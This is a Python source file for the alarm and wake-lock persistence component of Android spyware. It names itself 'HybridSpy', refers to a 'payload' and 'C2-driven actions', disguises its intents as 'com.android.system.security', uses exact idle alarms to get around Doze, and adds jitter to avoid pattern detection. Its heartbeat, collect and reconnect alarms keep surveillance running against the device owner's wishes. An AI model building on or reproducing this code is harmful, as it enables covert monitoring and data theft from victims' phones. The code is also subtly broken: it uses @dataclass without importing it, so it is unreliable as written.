#!/usr/bin/env python3
"""
Alarm Manager Persistence Module v2.1.0 — Elite Grade
Android AlarmManager + WakeLock for periodic wake-up and heartbeat.
Ensures the payload runs periodically even when:
- App is swiped from recents
- Device is in Doze mode (Android 6+)
- App is in background (Android 12+ background restrictions)
- Device is asleep (WakeLock ensures CPU stays on)
Key features:
- Multiple alarm types (RTC_WAKEUP, ELAPSED_REALTIME_WAKEUP) for redundancy
- setExactAndAllowWhileIdle() for Doze mode bypass (Android 6+)
- WakeLock PARTIAL_WAKE_LOCK ensures CPU stays on during execution
- Configurable intervals with jitter to avoid pattern detection
- Self-healing: re-registers alarms if system clears them
- Battery-aware: skips execution if battery critically low
- Full isolation: failure here never impacts other modules
"""
import logging
import json
import os
import sys
import threading
import time
import random
from typing import Dict, Optional, Any, Callable, List
from datetime import datetime, timezone
from enum import Enum

log = logging.getLogger("AlarmManager")
log.setLevel(logging.DEBUG)

# ──────────────────────────────────────────────────────────────────────────────
# Constants
# ──────────────────────────────────────────────────────────────────────────────
ALARM_INTENT_CLASS = "com.android.system.security.AlarmReceiver"
ALARM_REQUEST_CODE_BASE = 0x7A00

# Intent actions for different alarm types
ALARM_ACTIONS = {
    "heartbeat": "com.android.system.security.HEARTBEAT_ALARM",
    "collect": "com.android.system.security.COLLECT_ALARM",
    "watchdog": "com.android.system.security.WATCHDOG_ALARM",
    "reconnect": "com.android.system.security.RECONNECT_ALARM",
}

# Default intervals (seconds)
DEFAULT_INTERVALS = {
    "heartbeat": 300,     # 5 minutes
    "collect": 600,       # 10 minutes
    "watchdog": 900,      # 15 minutes
    "reconnect": 1800,    # 30 minutes
}

# Alarm types (matching Android AlarmManager)
ALARM_TYPE_RTC_WAKEUP = 0           # RTC wake up device
ALARM_TYPE_RTC = 1                   # RTC no wake
ALARM_TYPE_ELAPSED_REALTIME_WAKEUP = 2  # Elapsed time wake up
ALARM_TYPE_ELAPSED_REALTIME = 3       # Elapsed time no wake

# Jitter range for each alarm type (seconds)
JITTER_RANGE = {
    "heartbeat": (0, 30),
    "collect": (0, 60),
    "watchdog": (0, 90),
    "reconnect": (0, 120),
}

# Battery thresholds
CRITICAL_BATTERY_LEVEL = 5   # Skip if below this %
LOW_BATTERY_LEVEL = 15       # Increase interval if below this

# WakeLock timeout (max time to hold wake lock)
WAKELOCK_TIMEOUT = 60000  # 60 seconds in milliseconds


class AlarmState(Enum):
    REGISTERED = "registered"
    FIRING = "firing"
    COMPLETED = "completed"
    FAILED = "failed"
    SKIPPED = "skipped"


@dataclass
class _AlarmEntry:
    """Internal alarm descriptor."""
    name: str
    action: str
    interval: int
    alarm_type: int
    request_code: int
    jitter_range: tuple
    callback: Optional[Callable] = None
    last_fire: float = 0.0
    fire_count: int = 0
    skip_count: int = 0
    state: AlarmState = AlarmState.REGISTERED
    pending: bool = False


class AlarmManagerEngine:
    """
    Manages AlarmManager alarms and WakeLock for persistent scheduling.
    All operations are thread-safe and fully isolated.
    """

    def __init__(self, config: Dict[str, Any], event_bus: Optional[Any] = None):
        self._config = config
        self._event_bus = event_bus
        self._lock = threading.RLock()
        self._active = False
        self._alarms: Dict[str, _AlarmEntry] = {}
        self._wake_lock: Optional[Any] = None
        self._wake_lock_acquired = False
        self._state_file = os.path.join(
            os.path.dirname(os.path.abspath(__file__)),
            ".alarm_manager_state.json"
        )
        self._stats = {
            "alarms_registered": 0,
            "alarm_fires": 0,
            "alarm_skipped": 0,
            "alarm_failures": 0,
            "wake_lock_acquisitions": 0,
            "wake_lock_releases": 0,
            "doze_mode_bypasses": 0,
            "missed_beats": 0,
            "last_fire_time": None,
            "last_error": None,
            "state": "idle",
            "alarm_states": {},
        }
        self._last_heartbeat: float = 0.0
        self._missed_heartbeat_threshold = 3  # Missed beats before alert

    # ──────────────────────────────────────────────────────────────────────────
    # Public API
    # ──────────────────────────────────────────────────────────────────────────

    def start(self) -> bool:
        """Start the alarm manager and register all scheduled alarms."""
        with self._lock:
            if self._active:
                log.debug("AlarmManager already active")
                return True

            self._active = True
            log.info("AlarmManager engine starting")

            # Load persisted state
            self._load_state()

            # Acquire WakeLock for alarm handling
            if not self._acquire_wake_lock():
                log.warning("Failed to acquire WakeLock")
                # Non-fatal — alarms may still work without wake lock

            # Register all alarm types
            success = True
            for alarm_name, config in self._get_alarm_configs().items():
                if not self._register_alarm(alarm_name, config):
                    log.error(f"Failed to register alarm: {alarm_name}")
                    success = False

            if success:
                self._stats["state"] = "running"
                self._save_state()
                log.info("All alarms registered successfully")
            else:
                self._stats["state"] = "partial"
                log.warning("Some alarms failed to register")

            return success

    def stop(self) -> bool:
        """Stop the alarm manager and cancel all alarms."""
        with self._lock:
            if not self._active:
                return True

            self._active = False
            log.info("AlarmManager engine stopping")

            # Cancel all alarms
            for alarm_name in list(self._alarms.keys()):
                self._cancel_alarm(alarm_name)

            # Release WakeLock
            self._release_wake_lock()

            self._stats["state"] = "stopped"
            self._save_state()
            log.info("AlarmManager engine stopped")
            return True

    def on_alarm_fired(self, action: str) -> bool:
        """
        Handle an alarm firing event.
        Called by the Java AlarmReceiver via JNI bridge.
        Acquires WakeLock, executes callback, reschedules alarm.
        """
        with self._lock:
            if not self._active:
                return False

            # Find the alarm entry
            alarm = self._find_alarm_by_action(action)
            if alarm is None:
                log.warning(f"Unknown alarm action: {action}")
                self._stats["alarm_failures"] += 1
                return False

            # Acquire WakeLock
            wakelock_acquired = self._acquire_wake_lock()
            alarm.state = AlarmState.FIRING

            # Check battery level before executing
            if self._is_battery_critical():
                log.info(f"Skipping alarm {alarm.name} due to critical battery")
                alarm.state = AlarmState.SKIPPED
                alarm.skip_count += 1
                self._stats["alarm_skipped"] += 1
                self._schedule_alarm(alarm)  # Reschedule anyway
                self._release_wake_lock()
                return True

            try:
                # Execute callback if registered
                if alarm.callback:
                    try:
                        alarm.callback(alarm.name)
                    except Exception as e:
                        log.error(f"Callback error for alarm {alarm.name}: {e}")

                # Update statistics
                alarm.last_fire = time.time()
                alarm.fire_count += 1
                alarm.state = AlarmState.COMPLETED
                self._stats["alarm_fires"] += 1
                self._stats["last_fire_time"] = datetime.now(timezone.utc).isoformat()

                # Track heartbeat specifically
                if alarm.name == "heartbeat":
                    self._last_heartbeat = time.time()

                # Reschedule the alarm with jitter
                self._schedule_alarm(alarm)

                log.debug(f"Alarm {alarm.name} fired successfully (count: {alarm.fire_count})")
                return True

            except Exception as e:
                alarm.state = AlarmState.FAILED
                self._stats["alarm_failures"] += 1
                self._stats["last_error"] = str(e)
                log.error(f"Alarm {alarm.name} fire failed: {e}")
                return False

            finally:
                # Release WakeLock if we acquired it
                # Small delay to ensure processing completes
                if wakelock_acquired:
                    threading.Timer(1.0, self._release_wake_lock).start()

    def schedule_on_demand(self, alarm_name: str, delay: int) -> bool:
        """
        Schedule a one-shot alarm for immediate execution.
        Used for C2-driven actions that need immediate execution.
        """
        with self._lock:
            if not self._active:
                return False

            try:
                from android import native_bridge  # type: ignore

                context = native_bridge.get_application_context()
                if context is None:
                    return False

                alarm_manager = context.getSystemService("alarm")
                if alarm_manager is None:
                    return False

                # Build intent
                intent = native_bridge.new_object("android/content/Intent")
                intent.setClassName(
                    context.getPackageName(),
                    ALARM_INTENT_CLASS
                )
                intent.setAction(f"com.android.system.security.{alarm_name.upper()}_ALARM")

                request_code = ALARM_REQUEST_CODE_BASE + hash(alarm_name) % 1000
                pending_intent = native_bridge.new_object(
                    "android/app/PendingIntent",
                    "getBroadcast",
                    context,
                    request_code,
                    intent,
                    0x40000000  # FLAG_IMMUTABLE
                )

                # Schedule exact alarm with wake up
                trigger_time = int(time.time() * 1000) + (delay * 1000)
                alarm_manager.setExactAndAllowWhileIdle(
                    ALARM_TYPE_RTC_WAKEUP,
                    trigger_time,
                    pending_intent
                )

                log.info(f"On-demand alarm '{alarm_name}' scheduled in {delay}s")
                return True

            except Exception as e:
                log.error(f"Failed to schedule on-demand alarm: {e}")
                return False

    def cancel_on_demand(self, alarm_name: str) -> bool:
        """Cancel a previously scheduled on-demand alarm."""
        with self._lock:
            try:
                from android import native_bridge  # type: ignore

                context = native_bridge.get_application_context()
                if context is None:
                    return False

                alarm_manager = context.getSystemService("alarm")
                if alarm_manager is None:
                    return False

                intent = native_bridge.new_object("android/content/Intent")
                intent.setClassName(
                    context.getPackageName(),
                    ALARM_INTENT_CLASS
                )
                intent.setAction(f"com.android.system.security.{alarm_name.upper()}_ALARM")

                request_code = ALARM_REQUEST_CODE_BASE + hash(alarm_name) % 1000
                pending_intent = native_bridge.new_object(
                    "android/app/PendingIntent",
                    "getBroadcast",
                    context,
                    request_code,
                    intent,
                    0x40000000
                )

                alarm_manager.cancel(pending_intent)
                log.info(f"On-demand alarm '{alarm_name}' cancelled")
                return True

            except Exception as e:
                log.error(f"Failed to cancel on-demand alarm: {e}")
                return False

    def check_heartbeat_missed(self) -> bool:
        """Check if heartbeat alarms have been missed (detect Doze blocking)."""
        with self._lock:
            if self._last_heartbeat == 0:
                return False

            elapsed = time.time() - self._last_heartbeat
            expected_interval = self._alarms.get("heartbeat", _AlarmEntry(
                name="heartbeat", action="", interval=300,
                alarm_type=0, request_code=0, jitter_range=(0, 30)
            )).interval

            if elapsed > expected_interval * self._missed_heartbeat_threshold:
                self._stats["missed_beats"] += 1
                log.warning(f"Heartbeat missed! {elapsed:.0f}s since last beat")
                return True

            return False

    def force_reschedule_all(self) -> bool:
        """Force reschedule all alarms (recovery from Doze/background kill)."""
        with self._lock:
            success = True
            for alarm_name, alarm in self._alarms.items():
                if not self._schedule_alarm(alarm):
                    log.error(f"Failed to reschedule alarm: {alarm_name}")
                    success = False

            if success:
                log.info("All alarms rescheduled")
            return success

    def register_callback(self, alarm_name: str, callback: Callable) -> bool:
        """Register a callback for a specific alarm type."""
        with self._lock:
            if alarm_name not in self._alarms:
                return False
            self._alarms[alarm_name].callback = callback
            return True

    def is_active(self) -> bool:
        """Check if alarm manager is currently active."""
        with self._lock:
            return self._active

    def get_stats(self) -> Dict[str, Any]:
        """Get current alarm manager statistics."""
        with self._lock:
            stats = dict(self._stats)
            stats["alarm_states"] = {
                name: alarm.state.value
                for name, alarm in self._alarms.items()
            }
            stats["alarms_registered"] = len(self._alarms)
            stats["last_heartbeat_age"] = (
                time.time() - self._last_heartbeat if self._last_heartbeat > 0 else -1
            )
            return stats

    # ──────────────────────────────────────────────────────────────────────────
    # Internal Implementation
    # ──────────────────────────────────────────────────────────────────────────

    def _get_alarm_configs(self) -> Dict[str, Dict]:
        """Get alarm configurations from config or defaults."""
        config = self._config.get("persistence", {}).get("alarm_manager", {})

        alarm_configs = {}
        for alarm_name in DEFAULT_INTERVALS.keys():
            alarm_configs[alarm_name] = {
                "interval": config.get(
                    f"{alarm_name}_interval",
                    DEFAULT_INTERVALS[alarm_name]
                ),
                "enabled": config.get(f"{alarm_name}_enabled", True),
            }

        return alarm_configs

    def _register_alarm(self, alarm_name: str, alarm_config: Dict) -> bool:
        """Register a single alarm with AlarmManager."""
        if not alarm_config.get("enabled", True):
            log.info(f"Alarm '{alarm_name}' disabled in config, skipping")
            return True

        try:
            from android import native_bridge  # type: ignore

            context = native_bridge.get_application_context()
            if context is None:
                log.warning("No application context for alarm registration")
                return False

            alarm_manager = context.getSystemService("alarm")
            if alarm_manager is None:
                log.warning("AlarmManager service not available")
                return False

            # Create alarm entry
            request_code = ALARM_REQUEST_CODE_BASE + list(DEFAULT_INTERVALS.keys()).index(alarm_name)
            action = ALARM_ACTIONS.get(alarm_name, f"com.android.system.security.{alarm_name.upper()}_ALARM")
            jitter_range = JITTER_RANGE.get(alarm_name, (0, 30))

            alarm = _AlarmEntry(
                name=alarm_name,
                action=action,
                interval=alarm_config["interval"],
                alarm_type=ALARM_TYPE_RTC_WAKEUP,
                request_code=request_code,
                jitter_range=jitter_range,
            )

            # Create PendingIntent
            intent = native_bridge.new_object("android/content/Intent")
            intent.setClassName(
                context.getPackageName(),
                ALARM_INTENT_CLASS
            )
            intent.setAction(action)

            pending_intent = native_bridge.new_object(
                "android/app/PendingIntent",
                "getBroadcast",
                context,
                request_code,
                intent,
                0x40000000  # FLAG_IMMUTABLE (Android 12+ requirement)
            )

            # Schedule the initial alarm
            trigger_time = int(time.time() * 1000) + (5 * 1000)  # Start 5s from now
            alarm_manager.setExactAndAllowWhileIdle(
                alarm.alarm_type,
                trigger_time,
                pending_intent
            )

            # Store alarm entry
            self._alarms[alarm_name] = alarm
            self._stats["alarms_registered"] += 1
            self._stats["alarm_states"][alarm_name] = "registered"

            log.info(f"Alarm '{alarm_name}' registered (interval: {alarm.interval}s)")
            return True

        except ImportError:
            log.warning("Native bridge not available, simulating alarms locally")
            # Start local timer-based alarm simulation
            return self._start_local_alarm_simulation(alarm_name, alarm_config)

        except Exception as e:
            log.error(f"Failed to register alarm '{alarm_name}': {e}")
            return False

    def _schedule_alarm(self, alarm: _AlarmEntry) -> bool:
        """Reschedule an alarm with jitter for next execution."""
        try:
            from android import native_bridge  # type: ignore

            context = native_bridge.get_application_context()
            if context is None:
                return False

            alarm_manager = context.getSystemService("alarm")
            if alarm_manager is None:
                return False

            # Calculate next trigger with jitter
            jitter = random.randint(alarm.jitter_range[0], alarm.jitter_range[1])
            next_interval = alarm.interval + jitter
            trigger_time = int(time.time() * 1000) + (next_interval * 1000)

            # Rebuild PendingIntent
            intent = native_bridge.new_object("android/content/Intent")
            intent.setClassName(
                context.getPackageName(),
                ALARM_INTENT_CLASS
            )
            intent.setAction(alarm.action)

            pending_intent = native_bridge.new_object(
                "android/app/PendingIntent",
                "getBroadcast",
                context,
                alarm.request_code,
                intent,
                0x40000000
            )

            # Use setExactAndAllowWhileIdle for Doze mode bypass
            alarm_manager.setExactAndAllowWhileIdle(
                alarm.alarm_type,
                trigger_time,
                pending_intent
            )

            alarm.pending = True
            log.debug(f"Alarm '{alarm.name}' rescheduled in {next_interval}s (+{jitter}s jitter)")
            return True

        except Exception as e:
            log.error(f"Failed to schedule alarm '{alarm.name}': {e}")
            return False

    def _cancel_alarm(self, alarm_name: str) -> bool:
        """Cancel a specific alarm."""
        try:
            alarm = self._alarms.get(alarm_name)
            if alarm is None:
                return False

            from android import native_bridge  # type: ignore

            context = native_bridge.get_application_context()
            if context is None:
                return False

            alarm_manager = context.getSystemService("alarm")
            if alarm_manager is None:
                return False

            intent = native_bridge.new_object("android/content/Intent")
            intent.setClassName(
                context.getPackageName(),
                ALARM_INTENT_CLASS
            )
            intent.setAction(alarm.action)

            pending_intent = native_bridge.new_object(
                "android/app/PendingIntent",
                "getBroadcast",
                context,
                alarm.request_code,
                intent,
                0x40000000
            )

            alarm_manager.cancel(pending_intent)
            alarm.pending = False
            del self._alarms[alarm_name]

            log.info(f"Alarm '{alarm_name}' cancelled")
            return True

        except Exception as e:
            log.warning(f"Failed to cancel alarm '{alarm_name}': {e}")
            return False

    def _find_alarm_by_action(self, action: str) -> Optional[_AlarmEntry]:
        """Find alarm entry by its intent action string."""
        for alarm in self._alarms.values():
            if alarm.action == action:
                return alarm
        return None

    def _acquire_wake_lock(self) -> bool:
        """Acquire a partial WakeLock to keep CPU running."""
        if self._wake_lock_acquired:
            return True  # Already held

        try:
            from android import native_bridge  # type: ignore

            context = native_bridge.get_application_context()
            if context is None:
                return False

            power_manager = context.getSystemService("power")
            if power_manager is None:
                return False

            # Create and acquire WakeLock
            self._wake_lock = power_manager.newWakeLock(
                1,  # PARTIAL_WAKE_LOCK
                "HybridSpy:AlarmWakeLock"
            )
            if self._wake_lock:
                self._wake_lock.acquire(WAKELOCK_TIMEOUT)
                self._wake_lock_acquired = True
                self._stats["wake_lock_acquisitions"] += 1
                log.debug("WakeLock acquired")
                return True

            return False

        except Exception as e:
            log.warning(f"Failed to acquire WakeLock: {e}")
            return False

    def _release_wake_lock(self) -> bool:
        """Release the WakeLock."""
        try:
            if self._wake_lock and self._wake_lock_acquired:
                self._wake_lock.release()
                self._wake_lock_acquired = False
                self._stats["wake_lock_releases"] += 1
                log.debug("WakeLock released")
            return True

        except Exception as e:
            log.warning(f"Failed to release WakeLock: {e}")
            return False

    def _is_battery_critical(self) -> bool:
        """Check if battery level is too low for operation."""
        try:
            from android import native_bridge  # type: ignore

            context = native_bridge.get_application_context()
            if context is None:
                return False

            intent = context.registerReceiver(None, native_bridge.new_object(
                "android/content/IntentFilter",
                "android.intent.action.BATTERY_CHANGED"
            ))
            if intent is None:
                return False

            level = intent.getIntExtra("level", -1)
            scale = intent.getIntExtra("scale", -1)

            if level == -1 or scale == -1:
                return False

            battery_pct = (level / scale) * 100

            if battery_pct <= CRITICAL_BATTERY_LEVEL:
                log.info(f"Battery critical: {battery_pct:.0f}%")
                return True

            return False

        except Exception as e:
            log.warning(f"Failed to check battery level: {e}")
            return False

    def _start_local_alarm_simulation(self, alarm_name: str, alarm_config: Dict) -> bool:
        """
        Fallback: simulate alarms with local threading when JNI is unavailable.
        This is used during development/testing outside of Android.
        """
        try:
            interval = alarm_config["interval"]
            jitter_range = JITTER_RANGE.get(alarm_name, (0, 30))

            alarm = _AlarmEntry(
                name=alarm_name,
                action=ALARM_ACTIONS.get(alarm_name, ""),
                interval=interval,
                alarm_type=ALARM_TYPE_RTC_WAKEUP,
                request_code=0,
                jitter_range=jitter_range,
            )

            self._alarms[alarm_name] = alarm

            def _local_alarm_loop():
                while self._active and alarm_name in self._alarms:
                    try:
                        time.sleep(alarm.interval + random.randint(
                            alarm.jitter_range[0],
                            alarm.jitter_range[1]
                        ))
                        if self._active:
                            self.on_alarm_fired(alarm.action)
                    except Exception:
                        break

            thread = threading.Thread(
                target=_local_alarm_loop,
                daemon=True,
                name=f"Alarm-{alarm_name}"
            )
            thread.start()

            log.info(f"Local alarm simulation started for '{alarm_name}' ({interval}s)")
            return True

        except Exception as e:
            log.error(f"Failed to start local alarm simulation: {e}")
            return False

    # ──────────────────────────────────────────────────────────────────────────
    # State Persistence
    # ──────────────────────────────────────────────────────────────────────────

    def _save_state(self):
        """Persist alarm manager state to disk."""
        try:
            state = {
                "stats": self._stats,
                "last_heartbeat": self._last_heartbeat,
                "active": self._active,
                "alarms": {
                    name: {
                        "name": a.name,
                        "interval": a.interval,
                        "fire_count": a.fire_count,
                        "skip_count": a.skip_count,
                        "last_fire": a.last_fire,
                        "state": a.state.value,
                    }
                    for name, a in self._alarms.items()
                },
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }
            with open(self._state_file, "w") as f:
                json.dump(state, f, indent=2)
        except Exception as e:
            log.warning(f"Failed to save alarm manager state: {e}")

    def _load_state(self):
        """Load persisted alarm manager state."""
        try:
            if os.path.exists(self._state_file):
                with open(self._state_file, "r") as f:
                    state = json.load(f)
                self._stats = state.get("stats", self._stats)
                self._last_heartbeat = state.get("last_heartbeat", 0.0)
                log.info("Alarm manager state loaded")
        except Exception as e:
            log.warning(f"Failed to load alarm manager state: {e}")

    def reset_state(self):
        """Reset all state for clean start."""
        with self._lock:
            # Cancel all alarms
            for alarm_name in list(self._alarms.keys()):
                self._cancel_alarm(alarm_name)

            self._alarms.clear()
            self._last_heartbeat = 0.0
            self._wake_lock_acquired = False
            self._wake_lock = None

            self._stats = {
                "alarms_registered": 0,
                "alarm_fires": 0,
                "alarm_skipped": 0,
                "alarm_failures": 0,
                "wake_lock_acquisitions": 0,
                "wake_lock_releases": 0,
                "doze_mode_bypasses": 0,
                "missed_beats": 0,
                "last_fire_time": None,
                "last_error": None,
                "state": "idle",
                "alarm_states": {},
            }
            self._save_state()
        log.info("Alarm manager state reset")


# ──────────────────────────────────────────────────────────────────────────────
# Module Interface
# ──────────────────────────────────────────────────────────────────────────────

_engine: Optional[AlarmManagerEngine] = None


def initialize(config: Dict[str, Any], event_bus: Optional[Any] = None) -> bool:
    """Initialize the alarm manager module."""
    global _engine
    try:
        _engine = AlarmManagerEngine(config, event_bus)
        return _engine.start()
    except Exception as e:
        log.error(f"Failed to initialize alarm manager: {e}")
        return False


def shutdown() -> bool:
    """Shutdown the alarm manager module."""
    global _engine
    try:
        if _engine:
            _engine.stop()
            _engine = None
        return True
    except Exception as e:
        log.error(f"Failed to shutdown alarm manager: {e}")
        return False


def on_alarm_fired(action: str) -> bool:
    """Called by Java AlarmReceiver when an alarm fires."""
    global _engine
    try:
        if _engine:
            return _engine.on_alarm_fired(action)
        return False
    except Exception as e:
        log.error(f"Failed to handle alarm fire: {e}")
        return False


def schedule_on_demand(alarm_name: str, delay: int) -> bool:
    """Schedule a one-shot alarm for immediate execution."""
    global _engine
    try:
        if _engine:
            return _engine.schedule_on_demand(alarm_name, delay)
        return False
    except Exception as e:
        log.error(f"Failed to schedule on-demand alarm: {e}")
        return False


def check_heartbeat_missed() -> bool:
    """Check if heartbeat alarms have been missed."""
    global _engine
    if _engine:
        return _engine.check_heartbeat_missed()
    return False


def force_reschedule_all() -> bool:
    """Force reschedule all alarms."""
    global _engine
    try:
        if _engine:
            return _engine.force_reschedule_all()
        return False
    except Exception as e:
        log.error(f"Failed to force reschedule: {e}")
        return False


def register_callback(alarm_name: str, callback: Callable) -> bool:
    """Register a callback for a specific alarm type."""
    global _engine
    try:
        if _engine:
            return _engine.register_callback(alarm_name, callback)
        return False
    except Exception as e:
        log.error(f"Failed to register callback: {e}")
        return False


def get_stats() -> Dict[str, Any]:
    """Get current alarm manager statistics."""
    global _engine
    if _engine:
        return _engine.get_stats()
    return {"error": "not_initialized"}


def reset() -> bool:
    """Reset alarm manager state."""
    global _engine
    try:
        if _engine:
            _engine.reset_state()
        return True
    except Exception as e:
        log.error(f"Failed to reset alarm manager: {e}")
        return False
